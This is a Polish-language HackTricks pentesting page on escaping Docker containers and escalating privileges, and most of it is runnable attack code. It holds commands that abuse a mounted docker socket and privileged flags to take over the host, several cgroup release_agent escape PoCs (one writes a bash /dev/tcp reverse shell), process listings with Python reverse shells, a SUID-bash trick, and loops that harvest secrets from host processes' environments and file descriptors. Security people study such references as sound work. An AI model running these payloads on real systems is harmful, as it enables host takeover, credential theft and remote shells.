# Docker Breakout / Privilege Escalation

{{#include ../../../../banners/hacktricks-training.md}}

## Automatyczna enumeracja i ucieczka

- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Może również **enumerować kontenery**
- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): To narzędzie jest dość **przydatne do enumeracji kontenera, w którym się znajdujesz, a nawet próby automatycznej ucieczki**
- [**amicontained**](https://github.com/genuinetools/amicontained): Przydatne narzędzie do uzyskania uprawnień, jakie ma kontener, aby znaleźć sposoby na ucieczkę z niego
- [**deepce**](https://github.com/stealthcopter/deepce): Narzędzie do enumeracji i ucieczki z kontenerów
- [**grype**](https://github.com/anchore/grype): Uzyskaj CVE zawarte w oprogramowaniu zainstalowanym w obrazie

## Ucieczka z zamontowanego gniazda Docker

Jeśli w jakiś sposób odkryjesz, że **gniazdo docker jest zamontowane** wewnątrz kontenera docker, będziesz w stanie się z niego wydostać.\
Zwykle zdarza się to w kontenerach docker, które z jakiegoś powodu muszą łączyć się z demonem docker, aby wykonać działania.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
W tym przypadku możesz używać standardowych poleceń docker do komunikacji z demonem docker:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
> [!NOTE]
> W przypadku gdy **gniazdo docker jest w nieoczekiwanym miejscu**, nadal możesz się z nim komunikować, używając polecenia **`docker`** z parametrem **`-H unix:///path/to/docker.sock`**

Demon Docker może również [nasłuchiwać na porcie (domyślnie 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) lub w systemach opartych na Systemd, komunikacja z demonem Docker może odbywać się przez gniazdo Systemd `fd://`.

> [!NOTE]
> Dodatkowo zwróć uwagę na gniazda uruchomieniowe innych wysokopoziomowych środowisk:
>
> - dockershim: `unix:///var/run/dockershim.sock`
> - containerd: `unix:///run/containerd/containerd.sock`
> - cri-o: `unix:///var/run/crio/crio.sock`
> - frakti: `unix:///var/run/frakti.sock`
> - rktlet: `unix:///var/run/rktlet.sock`
> - ...

## Wykorzystanie uprawnień do ucieczki

Powinieneś sprawdzić uprawnienia kontenera, jeśli ma któreś z następujących: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Możesz sprawdzić aktualne uprawnienia kontenera, używając **wcześniej wspomnianych automatycznych narzędzi** lub:
```bash
capsh --print
```
Na poniższej stronie możesz **dowiedzieć się więcej o możliwościach linuxa** i jak je wykorzystać do ucieczki/eskalacji uprawnień:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Ucieczka z uprzywilejowanych kontenerów

Uprzywilejowany kontener może być utworzony z flagą `--privileged` lub poprzez wyłączenie konkretnych zabezpieczeń:

- `--cap-add=ALL`
- `--security-opt apparmor=unconfined`
- `--security-opt seccomp=unconfined`
- `--security-opt label:disable`
- `--pid=host`
- `--userns=host`
- `--uts=host`
- `--cgroupns=host`
- `Mount /dev`

Flaga `--privileged` znacznie obniża bezpieczeństwo kontenera, oferując **nieograniczony dostęp do urządzeń** i omijając **kilka zabezpieczeń**. Aby uzyskać szczegółowy opis, zapoznaj się z dokumentacją na temat pełnych skutków `--privileged`.

{{#ref}}
../docker-privileged.md
{{#endref}}

### Uprzywilejowany + hostPID

Z tymi uprawnieniami możesz po prostu **przenieść się do przestrzeni nazw procesu działającego na hoście jako root** jak init (pid:1) po prostu uruchamiając: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Przetestuj to w kontenerze wykonując:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privileged

Tylko z flagą privileged możesz spróbować **uzyskać dostęp do dysku hosta** lub spróbować **uciec, nadużywając release_agent lub innych ucieczek**.

Przetestuj następujące obejścia w kontenerze, wykonując:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Montowanie dysku - Poc1

Dobrze skonfigurowane kontenery dockerowe nie pozwolą na polecenia takie jak **fdisk -l**. Jednak w przypadku źle skonfigurowanego polecenia docker, gdzie określono flagę `--privileged` lub `--device=/dev/sda1` z wielkimi literami, możliwe jest uzyskanie uprawnień do zobaczenia dysku hosta.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Aby przejąć maszynę hosta, jest to trywialne:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
I oto! Teraz możesz uzyskać dostęp do systemu plików hosta, ponieważ jest zamontowany w folderze `/mnt/hola`.

#### Montowanie dysku - Poc2

W obrębie kontenera, atakujący może próbować uzyskać dalszy dostęp do podstawowego systemu operacyjnego hosta za pomocą zapisywalnej objętości hostPath utworzonej przez klaster. Poniżej znajdują się niektóre powszechne rzeczy, które możesz sprawdzić w kontenerze, aby zobaczyć, czy możesz wykorzystać ten wektor ataku:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Ucieczka z uprawnieniami Wykorzystywanie istniejącego release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
```bash:Initial PoC
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### Ucieczka z uprawnieniami Wykorzystanie stworzonego release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
```bash:Second PoC
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
Znajdź **wyjaśnienie techniki** w:

{{#ref}}
docker-release_agent-cgroups-escape.md
{{#endref}}

#### Ucieczka z uprawnieniami wykorzystująca release_agent bez znajomości ścieżki względnej - PoC3

W poprzednich exploitach **ujawniona jest absolutna ścieżka kontenera w systemie plików hosta**. Jednak nie zawsze tak jest. W przypadkach, gdy **nie znasz absolutnej ścieżki kontenera w hoście**, możesz użyć tej techniki:

{{#ref}}
release_agent-exploit-relative-paths-to-pids.md
{{#endref}}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Wykonanie PoC w uprzywilejowanym kontenerze powinno dać wynik podobny do:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Ucieczka z uprawnieniami poprzez nadużywanie wrażliwych montażów

Istnieje kilka plików, które mogą być zamontowane i które dają **informacje o podstawowym hoście**. Niektóre z nich mogą nawet wskazywać **coś, co ma być wykonane przez hosta, gdy coś się wydarzy** (co pozwoli atakującemu uciec z kontenera).\
Nadużycie tych plików może pozwolić na:

- release_agent (już omówione wcześniej)
- [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
- [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
- [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Jednak możesz znaleźć **inne wrażliwe pliki**, które warto sprawdzić na tej stronie:

{{#ref}}
sensitive-mounts.md
{{#endref}}

### Dowolne montaże

W wielu przypadkach zauważysz, że **kontener ma zamontowany jakiś wolumin z hosta**. Jeśli ten wolumin nie został poprawnie skonfigurowany, możesz być w stanie **uzyskać dostęp/modyfikować wrażliwe dane**: Czytać sekrety, zmieniać ssh authorized_keys…
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Eskalacja uprawnień z 2 powłokami i montowaniem hosta

Jeśli masz dostęp jako **root wewnątrz kontenera**, który ma zamontowany jakiś folder z hosta i udało ci się **uciec jako użytkownik bez uprawnień do hosta** oraz masz dostęp do odczytu zamontowanego folderu.\
Możesz stworzyć **plik bash suid** w **zamontowanym folderze** wewnątrz **kontenera** i **wykonać go z hosta**, aby uzyskać eskalację uprawnień.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Eskalacja uprawnień z 2 powłokami

Jeśli masz dostęp jako **root wewnątrz kontenera** i **uciekłeś jako użytkownik bez uprawnień do hosta**, możesz wykorzystać obie powłoki do **eskalacji uprawnień wewnątrz hosta**, jeśli masz zdolność MKNOD wewnątrz kontenera (jest to domyślne) jak [**wyjaśniono w tym poście**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Dzięki takiej zdolności użytkownik root wewnątrz kontenera ma prawo do **tworzenia plików urządzeń blokowych**. Pliki urządzeń to specjalne pliki, które są używane do **dostępu do sprzętu i modułów jądra**. Na przykład, plik urządzenia blokowego /dev/sda daje dostęp do **odczytu surowych danych na dysku systemu**.

Docker chroni przed niewłaściwym użyciem plików urządzeń blokowych wewnątrz kontenerów, egzekwując politykę cgroup, która **blokuje operacje odczytu/zapisu plików urządzeń blokowych**. Niemniej jednak, jeśli plik urządzenia blokowego jest **tworzony wewnątrz kontenera**, staje się dostępny z zewnątrz kontenera poprzez katalog **/proc/PID/root/**. Ten dostęp wymaga, aby **właściciel procesu był taki sam** zarówno wewnątrz, jak i na zewnątrz kontenera.

**Przykład eksploatacji** z tego [**opisu**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Jeśli masz dostęp do procesów hosta, będziesz mógł uzyskać dostęp do wielu wrażliwych informacji przechowywanych w tych procesach. Uruchom laboratorium testowe:
```
docker run --rm -it --pid=host ubuntu bash
```
Na przykład będziesz mógł wylistować procesy używając czegoś takiego jak `ps auxn` i szukać wrażliwych szczegółów w poleceniach.

Następnie, ponieważ **masz dostęp do każdego procesu hosta w /proc/, możesz po prostu ukraść ich sekrety środowiskowe** uruchamiając:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Możesz również **uzyskać dostęp do deskryptorów plików innych procesów i odczytać ich otwarte pliki**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Możesz również **zabić procesy i spowodować DoS**.

> [!WARNING]
> Jeśli w jakiś sposób masz uprzywilejowany **dostęp do procesu poza kontenerem**, możesz uruchomić coś takiego jak `nsenter --target <pid> --all` lub `nsenter --target <pid> --mount --net --pid --cgroup`, aby **uruchomić powłokę z tymi samymi ograniczeniami ns** (mam nadzieję, że żadnymi) **jak ten proces.**

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Jeśli kontener został skonfigurowany z użyciem Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), stos sieciowy tego kontenera nie jest izolowany od hosta Docker (kontener dzieli przestrzeń nazw sieci hosta) i kontener nie otrzymuje przydzielonego własnego adresu IP. Innymi słowy, **kontener wiąże wszystkie usługi bezpośrednio z adresem IP hosta**. Ponadto kontener może **przechwytywać WSZYSTKI ruch sieciowy, który host** wysyła i odbiera na współdzielonym interfejsie `tcpdump -i eth0`.

Na przykład, możesz to wykorzystać do **podsłuchiwania, a nawet fałszowania ruchu** między hostem a instancją metadanych.

Jak w poniższych przykładach:

- [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
- [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)

Będziesz również w stanie uzyskać dostęp do **usług sieciowych powiązanych z localhost** wewnątrz hosta lub nawet uzyskać dostęp do **uprawnień metadanych węzła** (które mogą różnić się od tych, do których kontener ma dostęp).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Z `hostIPC=true` zyskujesz dostęp do zasobów komunikacji międzyprocesowej (IPC) hosta, takich jak **pamięć dzielona** w `/dev/shm`. Umożliwia to odczyt/zapis, gdzie te same zasoby IPC są używane przez inne procesy hosta lub pod. Użyj `ipcs`, aby dokładniej zbadać te mechanizmy IPC.

- **Zbadaj /dev/shm** - Sprawdź, czy w tej lokalizacji pamięci dzielonej znajdują się jakiekolwiek pliki: `ls -la /dev/shm`
- **Zbadaj istniejące obiekty IPC** – Możesz sprawdzić, czy jakiekolwiek obiekty IPC są używane za pomocą `/usr/bin/ipcs`. Sprawdź to za pomocą: `ipcs -a`

### Przywróć uprawnienia

Jeśli wywołanie systemowe **`unshare`** nie jest zabronione, możesz przywrócić wszystkie uprawnienia, uruchamiając:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Nadużycie przestrzeni nazw użytkownika za pomocą symlink

Druga technika opisana w poście [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) wskazuje, jak można nadużyć montowania powiązań z przestrzeniami nazw użytkownika, aby wpłynąć na pliki wewnątrz hosta (w tym konkretnym przypadku, usunąć pliki).

## CVE

### Eksploit Runc (CVE-2019-5736)

W przypadku, gdy możesz wykonać `docker exec` jako root (prawdopodobnie z sudo), spróbuj podnieść uprawnienia, uciekając z kontenera, nadużywając CVE-2019-5736 (eksploit [tutaj](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Ta technika zasadniczo **nadpisze** binarny plik _**/bin/sh**_ **hosta** **z kontenera**, więc każdy, kto wykonuje docker exec, może uruchomić ładunek.

Zmień ładunek odpowiednio i zbuduj main.go za pomocą `go build main.go`. Otrzymany plik binarny powinien być umieszczony w kontenerze docker do wykonania.\
Po wykonaniu, gdy tylko wyświetli `[+] Overwritten /bin/sh successfully`, musisz wykonać następujące polecenie z maszyny hosta:

`docker exec -it <container-name> /bin/sh`

To uruchomi ładunek, który jest obecny w pliku main.go.

Aby uzyskać więcej informacji: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

> [!NOTE]
> Istnieją inne CVE, na które kontener może być podatny, możesz znaleźć listę w [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)

## Niestandardowe ucieczki Docker

### Powierzchnia ucieczki Docker

- **Przestrzenie nazw:** Proces powinien być **całkowicie oddzielony od innych procesów** za pomocą przestrzeni nazw, więc nie możemy uciec, wchodząc w interakcję z innymi procesami z powodu przestrzeni nazw (domyślnie nie mogą komunikować się za pomocą IPC, gniazd unixowych, usług sieciowych, D-Bus, `/proc` innych procesów).
- **Użytkownik root**: Domyślnie użytkownik uruchamiający proces to użytkownik root (jednak jego uprawnienia są ograniczone).
- **Możliwości**: Docker pozostawia następujące możliwości: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
- **Syscalls**: To są syscalls, które **użytkownik root nie będzie mógł wywołać** (z powodu braku możliwości + Seccomp). Inne syscalls mogą być użyte do próby ucieczki.

{{#tabs}}
{{#tab name="x64 syscalls"}}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{{#endtab}}

{{#tab name="arm64 syscalls"}}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{{#endtab}}

{{#tab name="syscall_bf.c"}}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````

{{#endtab}}
{{#endtabs}}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

- Find the **path of the containers filesystem** inside the host
- You can do this via **mount**, or via **brute-force PIDs** as explained in the second release_agent exploit
- Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
- You should be able to **execute the trigger from inside the host**
- You need to know where the containers files are located inside the host to indicate a script you write inside the host
- Have **enough capabilities and disabled protections** to be able to abuse that functionality
- You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

- [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/_fel1x/status/1151487053370187776?lang=en-GB)
- [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
- [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
- [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

{{#include ../../../../banners/hacktricks-training.md}}
